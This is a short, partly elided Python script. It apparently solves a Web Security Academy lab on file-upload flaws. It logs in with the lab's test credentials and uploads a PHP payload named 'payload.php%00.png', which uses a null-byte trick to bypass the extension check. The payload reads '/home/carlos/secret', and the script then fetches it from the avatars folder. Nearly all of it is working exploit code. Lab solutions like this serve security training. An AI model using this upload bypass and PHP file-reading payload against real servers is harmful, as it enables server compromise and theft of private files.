...
url = "https://0a380093038061c581b02ac4009e00ff.web-security-academy.net"
user = "wiener"
password = "peter"
...
def exploit_file_upload(s,  url):
    ...
    if 'Log out' in res.text:
        ...
        params = {"avatar": ('payload.php%00.png', "<?php echo file_get_contents('/home/carlos/secret'); ?>", 'application/x-php'),
        "user": user,
        "csrf": csrf_token}
        ...
        url_to_payload = url + '/files/avatars/payload.php'
